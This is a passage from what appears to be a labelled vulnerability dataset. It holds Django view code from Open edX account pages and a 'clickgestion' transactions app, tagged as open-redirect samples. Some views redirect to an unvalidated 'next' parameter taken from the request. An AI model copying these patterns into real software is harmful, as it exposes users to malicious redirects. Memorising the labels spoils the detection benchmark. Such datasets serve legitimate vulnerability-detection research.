urlparse.parse_qs(urlparse.urlparse(redirect_to).query)\n            provider_id = next_args['tpa_hint'][0]\n            tpa_hint_provider = third_party_auth.provider.Registry.get(provider_id=provider_id)\n            if tpa_hint_provider:\n                if tpa_hint_provider.skip_hinted_login_dialog:\n                    # Forward the user directly to the provider's login URL when the provider is configured\n                    # to skip the dialog.\n                    return redirect(\n                        pipeline.get_login_url(provider_id, pipeline.AUTH_ENTRY_LOGIN, redirect_url=redirect_to)\n                    )\n                third_party_auth_hint = provider_id\n                initial_mode = \"hinted_login\"\n        except (KeyError, ValueError, IndexError):\n            pass\n\n    # If this is a themed site, revert to the old login/registration pages.\n    # We need to do this for now to support existing themes.\n    # Themed sites can use the new logistration page by setting\n    # 'ENABLE_COMBINED_LOGIN_REGISTRATION' in their\n    # configuration settings.\n    if is_request_in_themed_site() and not configuration_helpers.get_value('ENABLE_COMBINED_LOGIN_REGISTRATION', False):\n        if initial_mode == \"login\":\n            return old_login_view(request)\n        elif initial_mode == \"register\":\n            return old_register_view(request)\n\n    # Allow external auth to intercept and handle the request\n    ext_auth_response = _external_auth_intercept(request, initial_mode)\n    if ext_auth_response is not None:\n        return ext_auth_response\n\n    # Account activation message\n    account_activation_messages = [\n        {\n            'message': message.message, 'tags': message.tags\n        } for message in messages.get_messages(request) if 'account-activation' in message.tags\n    ]\n\n    # Otherwise, render the combined login/registration page\n    context = {\n        'data': {\n            'login_redirect_url': redirect_to,\n            'initial_mode': initial_mode,\n            'third_party_auth': _third_party_auth_context(request, redirect_to, third_party_auth_hint),\n            'third_party_auth_hint': third_party_auth_hint or '',\n            'platform_name': configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME),\n            'support_link': configuration_helpers.get_value('SUPPORT_SITE_LINK', settings.SUPPORT_SITE_LINK),\n            'password_reset_support_link': configuration_helpers.get_value(\n                'PASSWORD_RESET_SUPPORT_LINK', settings.PASSWORD_RESET_SUPPORT_LINK\n            ) or settings.SUPPORT_SITE_LINK,\n            'account_activation_messages': account_activation_messages,\n\n            # Include form descriptions retrieved from the user API.\n            # We could have the JS client make these requests directly,\n            # but we include them in the initial page load to avoid\n            # the additional round-trip to the server.\n            'login_form_desc': json.loads(form_descriptions['login']),\n            'registration_form_desc': json.loads(form_descriptions['registration']),\n            'password_reset_form_desc': json.loads(form_descriptions['password_reset']),\n            'account_creation_allowed': configuration_helpers.get_value(\n                'ALLOW_PUBLIC_ACCOUNT_CREATION', settings.FEATURES.get('ALLOW_PUBLIC_ACCOUNT_CREATION', True))\n        },\n        'login_redirect_url': redirect_to,  # This gets added to the query string of the \"Sign In\" button in header\n        'responsive': True,\n        'allow_iframing': True,\n        'disable_courseware_js': True,\n        'combined_login_and_register': True,\n        'disable_footer': not configuration_helpers.get_value(\n            'ENABLE_COMBINED_LOGIN_REGISTRATION_FOOTER',\n            settings.FEATURES['ENABLE_COMBINED_LOGIN_REGISTRATION_FOOTER']\n        ),\n    }\n\n    context = update_context_for_enterprise(request, context)\n\n    response = render_to_response('student_account/login_and_register.html', context)\n\n    # Remove enterprise cookie so that subsequent requests show default login page.\n    response.delete_cookie(\n        configuration_helpers.get_value(\"ENTERPRISE_CUSTOMER_COOKIE_NAME\", settings.ENTERPRISE_CUSTOMER_COOKIE_NAME),\n        domain=configuration_helpers.get_value(\"BASE_COOKIE_DOMAIN\", settings.BASE_COOKIE_DOMAIN),\n    )\n\n    return response\n\n\n@require_http_methods(['POST'])\ndef password_change_request_handler(request):\n    \"\"\"Handle password change requests originating from the account page.\n\n    Uses the Account API to email the user a link to the password reset page.\n\n    Note:\n        The next step in the password reset process (confirmation) is currently handled\n        by student.views.password_reset_confirm_wrapper, a custom wrapper around Django's\n        password reset confirmation view.\n\n    Args:\n        request (HttpRequest)\n\n    Returns:\n        HttpResponse: 200 if the email was sent successfully\n        HttpResponse: 400 if there is no 'email' POST parameter\n        HttpResponse: 403 if the client has been rate limited\n        HttpResponse: 405 if using an unsupported HTTP method\n\n    Example usage:\n\n        POST /account/password\n\n    \"\"\"\n\n    limiter = BadRequestRateLimiter()\n    if limiter.is_rate_limit_exceeded(request):\n        AUDIT_LOG.warning(\"Password reset rate limit exceeded\")\n        return HttpResponseForbidden()\n\n    user = request.user\n    # Prefer logged-in user's email\n    email = user.email if user.is_authenticated() else request.POST.get('email')\n\n    if email:\n        try:\n            request_password_change(email, request.is_secure())\n            user = user if user.is_authenticated() else User.objects.get(email=email)\n            destroy_oauth_tokens(user)\n        except UserNotFound:\n            AUDIT_LOG.info(\"Invalid password reset attempt\")\n            # Increment the rate limit counter\n            limiter.tick_bad_request_counter(request)\n\n        return HttpResponse(status=200)\n    else:\n        return HttpResponseBadRequest(_(\"No email address provided.\"))\n\n\ndef update_context_for_enterprise(request, context):\n    \"\"\"\n    Take the processed context produced by the view, determine if it's relevant\n    to a particular Enterprise Customer, and update it to include that customer's\n    enterprise metadata.\n    \"\"\"\n\n    context = context.copy()\n\n    sidebar_context = enterprise_sidebar_context(request)\n\n    if sidebar_context:\n        context['data']['registration_form_desc']['fields'] = enterprise_fields_only(\n            context['data']['registration_form_desc']\n        )\n        context.update(sidebar_context)\n        context['enable_enterprise_sidebar'] = True\n        context['data']['hide_auth_warnings'] = True\n    else:\n        context['enable_enterprise_sidebar'] = False\n\n    return context\n\n\ndef enterprise_fields_only(fields):\n    \"\"\"\n    Take the received field definition, and exclude those fields that we don't want\n    to require if the user is going to be a member of an Enterprise Customer.\n    \"\"\"\n    enterprise_exclusions = configuration_helpers.get_value(\n        'ENTERPRISE_EXCLUDED_REGISTRATION_FIELDS',\n        settings.ENTERPRISE_EXCLUDED_REGISTRATION_FIELDS\n    )\n    return [field for field in fields['fields'] if field['name'] not in enterprise_exclusions]\n\n\ndef enterprise_sidebar_context(request):\n    \"\"\"\n    Given the current request, render the HTML of a sidebar for the current\n    logistration view that depicts Enterprise-related information.\n    \"\"\"\n    enterprise_customer = enterprise_customer_for_request(request)\n\n    if not enterprise_customer:\n        return {}\n\n    platform_name = configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME)\n\n    if enterprise_customer.branding_configuration.logo:\n        enterprise_logo_url = enterprise_customer.branding_configuration.logo.url\n    else:\n        enterprise_logo_url = ''\n\n    if getattr(enterprise_customer.branding_configuration, 'welcome_message', None):\n        branded_welcome_template = enterprise_customer.branding_configuration.welcome_message\n    else:\n        branded_welcome_template = configuration_helpers.get_value(\n            'ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE',\n            settings.ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE\n        )\n\n    branded_welcome_string = branded_welcome_template.format(\n        start_bold=u'<b>',\n        end_bold=u'</b>',\n        enterprise_name=enterprise_customer.name,\n        platform_name=platform_name\n    )\n\n    platform_welcome_template = configuration_helpers.get_value(\n        'ENTERPRISE_PLATFORM_WELCOME_TEMPLATE',\n        settings.ENTERPRISE_PLATFORM_WELCOME_TEMPLATE\n    )\n    platform_welcome_string = platform_welcome_template.format(platform_name=platform_name)\n\n    context = {\n        'enterprise_name': enterprise_customer.name,\n        'enterprise_logo_url': enterprise_logo_url,\n        'enterprise_branded_welcome_string': branded_welcome_string,\n        'platform_welcome_string': platform_welcome_string,\n    }\n\n    return context\n\n\ndef _third_party_auth_context(request, redirect_to, tpa_hint=None):\n    \"\"\"Context for third party auth providers and the currently running pipeline.\n\n    Arguments:\n        request (HttpRequest): The request, used to determine if a pipeline\n            is currently running.\n        redirect_to: The URL to send the user to following successful\n            authentication.\n        tpa_hint (string): An override flag that will return a matching provider\n            as long as its configuration has been enabled\n\n    Returns:\n        dict\n\n    \"\"\"\n    context = {\n        \"currentProvider\": None,\n        \"providers\": [],\n        \"secondaryProviders\": [],\n        \"finishAuthUrl\": None,\n        \"errorMessage\": None,\n        \"registerFormSubmitButtonText\": _(\"Create Account\"),\n    }\n\n    if third_party_auth.is_enabled():\n        enterprise_customer = enterprise_customer_for_request(request)\n        if not enterprise_customer:\n            for enabled in third_party_auth.provider.Registry.displayed_for_login(tpa_hint=tpa_hint):\n                info = {\n                    \"id\": enabled.provider_id,\n                    \"name\": enabled.name,\n                    \"iconClass\": enabled.icon_class or None,\n                    \"iconImage\": enabled.icon_image.url if enabled.icon_image else None,\n                    \"loginUrl\": pipeline.get_login_url(\n                        enabled.provider_id,\n                        pipeline.AUTH_ENTRY_LOGIN,\n                        redirect_url=redirect_to,\n                    ),\n                    \"registerUrl\": pipeline.get_login_url(\n                        enabled.provider_id,\n                        pipeline.AUTH_ENTRY_REGISTER,\n                        redirect_url=redirect_to,\n                    ),\n                }\n                context[\"providers\" if not enabled.secondary else \"secondaryProviders\"].append(info)\n\n        running_pipeline = pipeline.get(request)\n        if running_pipeline is not None:\n            current_provider = third_party_auth.provider.Registry.get_from_pipeline(running_pipeline)\n\n            if current_provider is not None:\n                context[\"currentProvider\"] = current_provider.name\n                context[\"finishAuthUrl\"] = pipeline.get_complete_url(current_provider.backend_name)\n\n                if current_provider.skip_registration_form:\n                    # For enterprise (and later for everyone), we need to get explicit consent to the\n                    # Terms of service instead of auto submitting the registration form outright.\n                    if not enterprise_customer:\n                        # As a reliable way of \"skipping\" the registration form, we just submit it automatically\n                        context[\"autoSubmitRegForm\"] = True\n                    else:\n                        context[\"autoRegisterWelcomeMessage\"] = (\n                            'Thank you for joining {}. '\n                            'Just a couple steps before you start learning!'\n                        ).format(\n                            configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME)\n                        )\n                        context[\"registerFormSubmitButtonText\"] = _(\"Continue\")\n\n        # Check for any error messages we may want to display:\n        for msg in messages.get_messages(request):\n            if msg.extra_tags.split()[0] == \"social-auth\":\n                # msg may or may not be translated. Try translating [again] in case we are able to:\n                context['errorMessage'] = _(unicode(msg))  # pylint: disable=translation-of-non-string\n                break\n\n    return context\n\n\ndef _get_form_descriptions(request):\n    \"\"\"Retrieve form descriptions from the user API.\n\n    Arguments:\n        request (HttpRequest): The original request, used to retrieve session info.\n\n    Returns:\n        dict: Keys are 'login', 'registration', and 'password_reset';\n            values are the JSON-serialized form descriptions.\n\n    \"\"\"\n\n    return {\n        'password_reset': get_password_reset_form().to_json(),\n        'login': get_login_session_form().to_json(),\n        'registration': RegistrationFormFactory().get_registration_form(request).to_json()\n    }\n\n\ndef _external_auth_intercept(request, mode):\n    \"\"\"Allow external auth to intercept a login/registration request.\n\n    Arguments:\n        request (Request): The original request.\n        mode (str): Either \"login\" or \"register\"\n\n    Returns:\n        Response or None\n\n    \"\"\"\n    if mode == \"login\":\n        return external_auth_login(request)\n    elif mode == \"register\":\n        return external_auth_register(request)\n\n\ndef get_user_orders(user):\n    \"\"\"Given a user, get the detail of all the orders from the Ecommerce service.\n\n    Args:\n        user (User): The user to authenticate as when requesting ecommerce.\n\n    Returns:\n        list of dict, representing orders returned by the Ecommerce service.\n    \"\"\"\n    no_data = []\n    user_orders = []\n    commerce_configuration = CommerceConfiguration.current()\n    user_query = {'username': user.username}\n\n    use_cache = commerce_configuration.is_cache_enabled\n    cache_key = commerce_configuration.CACHE_KEY + '.' + str(user.id) if use_cache else None\n    api = ecommerce_api_client(user)\n    commerce_user_orders = get_edx_api_data(\n        commerce_configuration, 'orders', api=api, querystring=user_query, cache_key=cache_key\n    )\n\n    for order in commerce_user_orders:\n        if order['status'].lower() == 'complete':\n            date_placed = datetime.strptime(order['date_placed'], \"%Y-%m-%dT%H:%M:%SZ\")\n            order_data = {\n                'number': order['number'],\n                'price': order['total_excl_tax'],\n                'order_date': strftime_localized(date_placed, 'SHORT_DATE'),\n                'receipt_url': EcommerceService().get_receipt_page_url(order['number']),\n                'lines': order['lines'],\n            }\n            user_orders.append(order_data)\n\n    return user_orders\n\n\n@login_required\n@require_http_methods(['GET'])\ndef account_settings(request):\n    \"\"\"Render the current user's account settings page.\n\n    Args:\n        request (HttpRequest)\n\n    Returns:\n        HttpResponse: 200 if the page was sent successfully\n        HttpResponse: 302 if not logged in (redirect to login page)\n        HttpResponse: 405 if using an unsupported HTTP method\n\n    Example usage:\n\n        GET /account/settings\n\n    \"\"\"\n    return render_to_response('student_account/account_settings.html', account_settings_context(request))\n\n\n@login_required\n@require_http_methods(['GET'])\ndef finish_auth(request):  # pylint: disable=unused-argument\n    \"\"\" Following logistration (1st or 3rd party), handle any special query string params.\n\n    See FinishAuthView.js for details on the query string params.\n\n    e.g. auto-enroll the user in a course, set email opt-in preference.\n\n    This view just displays a \"Please wait\" message while AJAX calls are made to enroll the\n    user in the course etc. This view is only used if a parameter like \"course_id\" is present\n    during login/registration/third_party_auth. Otherwise, there is no need for it.\n\n    Ideally this view will finish and redirect to the next step before the user even sees it.\n\n    Args:\n        request (HttpRequest)\n\n    Returns:\n        HttpResponse: 200 if the page was sent successfully\n        HttpResponse: 302 if not logged in (redirect to login page)\n        HttpResponse: 405 if using an unsupported HTTP method\n\n    Example usage:\n\n        GET /account/finish_auth/?course_id=course-v1:blah&enrollment_action=enroll\n\n    \"\"\"\n    return render_to_response('student_account/finish_auth.html', {\n        'disable_courseware_js': True,\n        'disable_footer': True,\n    })\n\n\ndef account_settings_context(request):\n    \"\"\" Context for the account settings page.\n\n    Args:\n        request: The request object.\n\n    Returns:\n        dict\n\n    \"\"\"\n    user = request.user\n\n    year_of_birth_options = [(unicode(year), unicode(year)) for year in UserProfile.VALID_YEARS]\n    try:\n        user_orders = get_user_orders(user)\n    except:  # pylint: disable=bare-except\n        log.exception('Error fetching order history from Otto.')\n        # Return empty order list as account settings page expect a list and\n        # it will be broken if exception raised\n        user_orders = []\n\n    context = {\n        'auth': {},\n        'duplicate_provider': None,\n        'nav_hidden': True,\n        'fields': {\n            'country': {\n                'options': list(countries),\n            }, 'gender': {\n                'options': [(choice[0], _(choice[1])) for choice in UserProfile.GENDER_CHOICES],  # pylint: disable=translation-of-non-string\n            }, 'language': {\n                'options': released_languages(),\n            }, 'level_of_education': {\n                'options': [(choice[0], _(choice[1])) for choice in UserProfile.LEVEL_OF_EDUCATION_CHOICES],  # pylint: disable=translation-of-non-string\n            }, 'password': {\n                'url': reverse('password_reset'),\n            }, 'year_of_birth': {\n                'options': year_of_birth_options,\n            }, 'preferred_language': {\n                'options': all_languages(),\n            }, 'time_zone': {\n                'options': TIME_ZONE_CHOICES,\n            }\n        },\n        'platform_name': configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME),\n        'password_reset_support_link': configuration_helpers.get_value(\n            'PASSWORD_RESET_SUPPORT_LINK', settings.PASSWORD_RESET_SUPPORT_LINK\n        ) or settings.SUPPORT_SITE_LINK,\n        'user_accounts_api_url': reverse(\"accounts_api\", kwargs={'username': user.username}),\n        'user_preferences_api_url': reverse('preferences_api', kwargs={'username': user.username}),\n        'disable_courseware_js': True,\n        'show_program_listing': ProgramsApiConfig.is_enabled(),\n        'order_history': user_orders\n    }\n\n    if third_party_auth.is_enabled():\n        # If the account on the third party provider is already connected with another edX account,\n        # we display a message to the user.\n        context['duplicate_provider'] = pipeline.get_duplicate_provider(messages.get_messages(request))\n\n        auth_states = pipeline.get_provider_user_states(user)\n\n        context['auth']['providers'] = [{\n            'id': state.provider.provider_id,\n            'name': state.provider.name,  # The name of the provider e.g. Facebook\n            'connected': state.has_account,  # Whether the user's edX account is connected with the provider.\n            # If the user is not connected, they should be directed to this page to authenticate\n            # with the particular provider, as long as the provider supports initiating a login.\n            'connect_url': pipeline.get_login_url(\n                state.provider.provider_id,\n                pipeline.AUTH_ENTRY_ACCOUNT_SETTINGS,\n                # The url the user should be directed to after the auth process has completed.\n                redirect_url=reverse('account_settings'),\n            ),\n            'accepts_logins': state.provider.accepts_logins,\n            # If the user is connected, sending a POST request to this url removes the connection\n            # information for this provider from their edX account.\n            'disconnect_url': pipeline.get_disconnect_url(state.provider.provider_id, state.association_id),\n            # We only want to include providers if they are either currently available to be logged\n            # in with, or if the user is already authenticated with them.\n        } for state in auth_states if state.provider.display_for_login or state.has_account]\n\n    return context\n/n/n/n", "label": 1, "vtype": "open_redirect"}, {"id": "3836e2f5eae0391c89c5b4d0759604c9264630db", "code": "django_container/app/clickgestion/transactions/views.py/n/nfrom django.apps import apps\nfrom clickgestion.transactions.forms import TransactionEditForm, TransactionPayForm\nfrom clickgestion.transactions.models import BaseConcept, Transaction\nfrom django.shortcuts import get_object_or_404, render, redirect, reverse\nfrom django.utils.translation import gettext, gettext_lazy\nfrom clickgestion.transactions.filters import ConceptFilter, TransactionFilter\nfrom clickgestion.core.utilities import invalid_permission_redirect\nfrom django.views.generic import ListView\nfrom django.contrib.auth.decorators import login_required\nfrom pure_pagination.mixins import PaginationMixin\nfrom django.http import HttpResponse, QueryDict\nfrom django.conf import settings\nfrom django.utils import timezone\nfrom django_xhtml2pdf.utils import generate_pdf\nimport urllib\n\n\n@login_required()\ndef concept_delete(request, *args, **kwargs):\n    extra_context = {}\n\n    # Check permissions\n\n    # Get the concept and form\n    concept, concept_form = get_concept_and_form_from_kwargs(**kwargs)\n    extra_context['concept'] = concept\n\n    # Get the transaction\n    transaction = concept.transaction\n    if transaction.closed:\n        return redirect('message', message=gettext('Transaction Closed'))\n    extra_context['transaction'] = transaction\n\n    # Use default delete view\n    extra_context['header'] = gettext('Delete {}?'.format(concept.concept_type))\n    extra_context['message'] = concept.description_short\n    extra_context['next'] = request.META['HTTP_REFERER']\n\n    # POST\n    if request.method == 'POST':\n        default_next = reverse('transaction_detail', kwargs={'transaction_code': concept.transaction.code})\n        concept.delete()\n        next_page = request.POST.get('next', default_next)\n        return redirect(next_page)\n\n    # GET\n    else:\n        return render(request, 'core/delete.html', extra_context)\n\n\n@login_required()\ndef concept_detail(request, *args, **kwargs):\n    extra_context = {}\n\n    # Check permissions\n\n    # Get the concept and form\n    concept, concept_form = get_concept_and_form_from_kwargs(**kwargs)\n    extra_context['concept'] = concept\n\n    # Get the transaction\n    transaction = concept.transaction\n    extra_context['transaction'] = transaction\n\n    return render(request, 'transactions/concept_detail.html', extra_context)\n\n\n@login_required()\ndef concept_edit(request, *args, **kwargs):\n    extra_context = {}\n\n    # Check permissions\n\n    # Get the concept and form\n    concept, concept_form = get_concept_and_form_from_kwargs(**kwargs)\n    extra_context['concept'] = concept\n\n    # Get the transaction\n    transaction = concept.transaction\n    if transaction.closed:\n        return redirect('message', message=gettext('Transaction Closed'))\n    extra_context['transaction'] = transaction\n\n    # POST\n    if request.method == 'POST':\n        form = concept_form(request.POST, instance=concept)\n        if form.is_valid():\n            form.save()\n            return redirect('transaction_edit', transaction_code=transaction.code)\n\n        else:\n            extra_context['form'] = form\n            return render(request, 'transactions/concept_edit.html', extra_context)\n\n    # GET\n    else:\n\n        # Get the form\n        form = concept_form(instance=concept)\n        extra_context['form'] = form\n        return render(request, 'transactions/concept_edit.html', extra_context)\n\n\nclass ConceptList(PaginationMixin, ListView):\n\n    template_name = 'transactions/concept_list.html'\n    model = BaseConcept\n    context_object_name = 'concepts'\n    paginate_by = 8\n    # ListView.as_view will pass custom arguments here\n    queryset = None\n    header = gettext_lazy('Concepts')\n    request = None\n    filter = None\n    filter_data = None\n    is_filtered = False\n\n    def get(self, request, *args, **kwargs):\n        # First\n\n        # Check permissions\n        if not request.user.is_authenticated:\n            return invalid_permission_redirect(request)\n\n        # Get arguments\n        self.request = request\n        self.filter_data = kwargs.pop('filter_data', {})\n\n        # Call super\n        return super().get(self, request, *args, **kwargs)\n\n    def get_context_data(self, **kwargs):\n        # Third\n\n        # Call the base implementation first\n        context = super().get_context_data(**kwargs)\n\n        # Add data\n        context['header'] = self.header\n        context['filter'] = self.filter\n        context['is_filtered'] = self.is_filtered\n\n        return context\n\n    def get_queryset(self):\n        # Second\n\n        # Create filter querydict\n        data = QueryDict('', mutable=True)\n        # Add filters passed from view\n        data.update(self.filter_data)\n        # Add filters selected by user\n        data.update(self.request.GET)\n\n        # Record as filtered\n        self.is_filtered = False\n        if len([k for k in data.keys() if k != 'page']) > 0:\n            self.is_filtered = True\n\n        # Add filters by permission\n\n        # Filter the queryset\n        self.filter = ConceptFilter(data)\n        self.queryset = self.filter.qs.select_related('transaction') \\\n            .prefetch_related('value__currency') \\\n            .order_by('-id') # 79q 27ms\n\n        # Return\n        return self.queryset\n\n\ndef get_available_concepts(employee, transaction):\n    \"\"\"\n    Get a list of the available concepts that can be added to the given transaction.\n\n    :param employee: The employee executing the transaction (current user)\n    :param transaction: The open transaction\n    :return: A list of dictionaries.\n    \"\"\"\n\n    # get permissions according to transaction\n    concepts_permitted_by_transaction = transaction.get_all_permissions()\n\n    # get permissions according to employee\n    concepts_permitted_by_employee = employee.get_all_permissions()\n\n    # create the list of permitted concepts\n    available_concepts = []\n    for concept in settings.CONCEPTS:\n        permission = concept.replace('.','.add_')\n        concept_model = apps.get_model(concept)\n\n        # Skip this concept if not permitted by the user\n        if not permission in concepts_permitted_by_employee:\n            continue\n\n        # set default values\n        disabled = False\n        url = concept_model._url.format('new/{}'.format(transaction.code))\n\n        # disable this concept if not permitted by the transaction\n        if not permission in concepts_permitted_by_transaction:\n            disabled = True\n            url = '#'\n\n        # add to the list\n        available_concepts.append(\n            {\n                'name': concept_model._meta.verbose_name,\n                'url': url,\n                'disabled': disabled,\n            }\n        )\n\n    return available_concepts\n\n\ndef get_transaction_from_kwargs(**kwargs):\n    # Get the transaction\n    transaction_code = kwargs.get('transaction_code', None)\n    transaction = get_object_or_404(Transaction, code=transaction_code)\n    return transaction\n\n\ndef get_concept_and_form_from_kwargs(**kwargs):\n\n    # Get the form\n    concept_form = kwargs.get('concept_form', None)\n\n    # Get the concept class\n    concept_class = concept_form._meta.model\n\n    # If a transaction code is provided, this is a new concept\n    transaction_code = kwargs.get('transaction_code', None)\n    if transaction_code:\n        transaction = get_transaction_from_kwargs(**kwargs)\n        return concept_class(transaction=transaction), concept_form\n\n    # Get the existing concept\n    concept_code = kwargs.get('concept_code', None)\n    concept = get_object_or_404(concept_class, code=concept_code)\n    return concept, concept_form\n\n\ndef transaction_delete(request, *args, **kwargs):\n    extra_context = {}\n\n    # Check permissions\n    if not request.user.is_authenticated:\n        return invalid_permission_redirect(request)\n\n    # Get the object\n    transaction_code = kwargs.get('transaction_code', None)\n    transaction = get_object_or_404(Transaction, code=transaction_code)\n    extra_context['transaction'] = transaction\n\n    # Use default delete view\n    extra_context['header'] = gettext('Delete Transaction?')\n    extra_context['message'] = transaction.description_short\n    extra_context['next'] = request.META['HTTP_REFERER']\n\n    # POST\n    if request.method == 'POST':\n        default_next = reverse('transactions_open')\n        transaction.delete()\n        next_page = request.POST.get('next', default_next)\n        return redirect(next_page)\n\n    # GET\n    else:\n        return render(request, 'core/delete.html', extra_context)\n\n\n@login_required\ndef transaction_detail(request, *args, **kwargs):\n    extra_context = {}\n\n    # Check permissions\n    if not request.user.is_authenticated:\n        return invalid_permission_redirect(request)\n\n    # Get the transaction\n    transaction_code = kwargs.get('transaction_code', None)\n    transaction = get_object_or_404(Transaction, code=transaction_code)\n    extra_context['transaction'] = transaction\n    return render(request, 'transactions/transaction_detail.html', extra_context)\n\n\n@login_required\ndef transaction_edit(request, *args, **kwargs):\n    extra_context = {}\n\n    # Check permissions\n    if not request.user.is_authenticated:\n        return invalid_permission_redirect(request)\n\n    # Get the transaction\n    transaction_code = kwargs.get('transaction_code', None)\n    if not transaction_code:\n        transaction = Transaction.objects.create(employee=request.user)\n        return redirect('transaction_edit', transaction_code=transaction.code)\n\n    transaction = get_object_or_404(Transaction, code=transaction_code)\n    extra_context['transaction'] = transaction\n\n    # Check that the transaction is open\n    if transaction.closed:\n        return redirect('message', message=gettext('Transaction Closed'))\n\n    # Get available concepts to add\n    available_concepts = get_available_concepts(request.user, transaction)\n    extra_context['available_concepts'] = available_concepts\n\n    # POST\n    if request.method == 'POST':\n        form = TransactionEditForm(request.POST, instance=transaction)\n        valid = form.is_valid()\n\n        # Delete and go home\n        # Note that the form.data value is still a string before validating\n        if form.data['cancel_button'] == 'True':\n            transaction.delete()\n            return redirect('index')\n\n        # If valid\n        if valid:\n\n            # Save the transaction\n            transaction.save()\n\n            # Finish later\n            if form.cleaned_data['save_button']:\n                return redirect('transaction_detail', transaction_code=transaction.code)\n\n            # Proceed to pay\n            return redirect('transaction_pay', transaction_code=transaction.code)\n\n        else:\n            extra_context['form'] = form\n            return render(request, 'transactions/transaction_edit.html', extra_context)\n\n    # GET\n    else:\n\n        # Create the form\n        form = TransactionEditForm(instance=transaction)\n        extra_context['form'] = form\n        return render(request, 'transactions/transaction_edit.html', extra_context)\n\n\nclass TransactionList(PaginationMixin, ListView):\n\n    model = Transaction\n    context_object_name = 'transactions'\n    paginate_by = 8\n    # ListView.as_view will pass custom arguments here\n    queryset = None\n    header = gettext_lazy('Transactions')\n    request = None\n    filter = None\n    filter_data = None\n    is_filtered = False\n\n    def get(self, request, *args, **kwargs):\n        # First\n\n        # Check permissions\n        if not request.user.is_authenticated:\n            return invalid_permission_redirect(request)\n\n        # Get arguments\n        self.request = request\n        self.filter_data = kwargs.pop('filter_data', {})\n\n        # Call super\n        return super().get(self, request, *args, **kwargs)\n\n    def get_context_data(self, **kwargs):\n        # Third\n\n        # Call the base implementation first\n        context = super().get_context_data(**kwargs)\n\n        # Add data\n        context['header'] = self.header\n        context['filter'] = self.filter\n        context['is_filtered'] = self.is_filtered\n\n        return context\n\n    def get_queryset(self):\n        # Second\n\n        # Create filter querydict\n        data = QueryDict('', mutable=True)\n        # Add filters passed from view\n        data.update(self.filter_data)\n        # Add filters selected by user\n        data.update(self.request.GET)\n\n        # Record as filtered\n        self.is_filtered = False\n        if len([k for k in data.keys() if k != 'page']) > 0:\n            self.is_filtered = True\n\n        # Add filters by permission\n\n        # Filter the queryset\n        self.filter = TransactionFilter(data)\n        self.queryset = self.filter.qs.select_related('cashclose')\\\n            .prefetch_related('concepts__value__currency') \\\n            .order_by('-id')  # 79q 27ms\n\n        # Return\n        return self.queryset\n\n    def post(self, request, *args, **kwargs):\n\n        # Check permissions\n        if not request.user.is_authenticated:\n            return invalid_permission_redirect(request)\n\n        print_transaction = request.POST.get('print_transaction', None)\n        if print_transaction:\n            # Get the transaction\n            transaction = get_object_or_404(Transaction, code=print_transaction)\n            # Create an http response\n            resp = HttpResponse(content_type='application/pdf')\n            resp['Content-Disposition'] = 'attachment; filename=\"{}.pdf\"'.format(transaction.code)\n            # Set context\n            context = {\n                'transaction': transaction,\n            }\n            # Generate the pdf\n            result = generate_pdf('transactions/invoice.html', file_object=resp, context=context)\n            return result\n\n        # Return same\n        request.method = 'GET'\n        return self.get(request, *args, **kwargs)\n\n\n\n@login_required\ndef transaction_pay(request, *args, **kwargs):\n    extra_context = {}\n\n    # Check permissions\n    if not request.user.is_authenticated:\n        return invalid_permission_redirect(request)\n\n    # Get the transaction\n    transaction_code = kwargs.get('transaction_code', None)\n    transaction = get_object_or_404(Transaction, code=transaction_code)\n    extra_context['transaction'] = transaction\n\n    # Check that the transaction is open\n    if transaction.closed:\n        return redirect('message', message=gettext('Transaction Closed'))\n\n    # Get required payment fields\n\n    # POST\n    if request.method == 'POST':\n        form = TransactionPayForm(request.POST, instance=transaction)\n        valid = form.is_valid()\n\n        # If cancel has been set, delete and go home\n        # Note that value is still string before validating\n        if form.data['cancel_button'] == 'True':\n            transaction.delete()\n            return redirect('index')\n\n        # If valid\n        if valid:\n\n            # Close the transaction\n            if form.cleaned_data['confirm_button']:\n                transaction.closed = True\n                transaction.closed_date = timezone.datetime.now()\n                transaction.save()\n                return redirect('transaction_detail', transaction_code=transaction.code)\n\n            # Save the transaction\n            if form.cleaned_data['save_button']:\n                transaction.save()\n                return redirect('transaction_detail', transaction_code=transaction.code)\n\n        else:\n            extra_context['form'] = form\n            return render(request, 'transactions/transaction_pay.html', extra_context)\n\n    # GET\n    else:\n\n        # Create the form\n        form = TransactionPayForm(instance=transaction)\n        extra_context['form'] = form\n        return render(request, 'transactions/transaction_pay.html', extra_context)\n\n\ndef transactions_open(request, *args, **kwargs):\n\n    # Check permissions\n    if not request.user.is_authenticated:\n        return invalid_permission_redirect(request)\n\n    # Set initial filter data\n    filter_data = {\n        'closed': False,\n    }\n    params = urllib.parse.urlencode(filter_data)\n    # Return\n    response = redirect('transaction_list')\n    response['Location'] += '?{}'.format(params)\n    return response\n/n/n/n", "label": 0, "vtype": "open_redirect"}, {"id": "3836e2f5eae0391c89c5b4d0759604c9264630db", "code": "/django_container/app/clickgestion/transactions/views.py/n/nfrom django.apps import apps\nfrom clickgestion.transactions.forms import TransactionEditForm, TransactionPayForm\nfrom clickgestion.transactions.models import BaseConcept, Transaction\nfrom django.shortcuts import get_object_or_404, render, redirect, reverse\nfrom django.utils.translation import gettext, gettext_lazy\nfrom clickgestion.transactions.filters import ConceptFilter, TransactionFilter\nfrom clickgestion.core.utilities import invalid_permission_redirect\nfrom django.views.generic import ListView\nfrom django.contrib.auth.decorators import login_required\nfrom pure_pagination.mixins import PaginationMixin\nfrom django.http import HttpResponse, QueryDict\nfrom django.conf import settings\nfrom django.utils import timezone\nfrom django_xhtml2pdf.utils import generate_pdf\n\n\n@login_required()\ndef concept_delete(request, *args, **kwargs):\n    extra_context = {}\n\n    # Check permissions\n\n    # Get the concept and form\n    concept, concept_form = get_concept_and_form_from_kwargs(**kwargs)\n    extra_context['concept'] = concept\n\n    # Get the transaction\n    transaction = concept.transaction\n    if transaction.closed:\n        return redirect('message', message=gettext('Transaction Closed'))\n    extra_context['transaction'] = transaction\n\n    # Use default delete view\n    extra_context['header'] = gettext('Delete {}?'.format(concept.concept_type))\n    extra_context['message'] = concept.description_short\n    extra_context['next'] = request.META['HTTP_REFERER']\n\n    # POST\n    if request.method == 'POST':\n        default_next = reverse('transaction_detail', kwargs={'transaction_code': 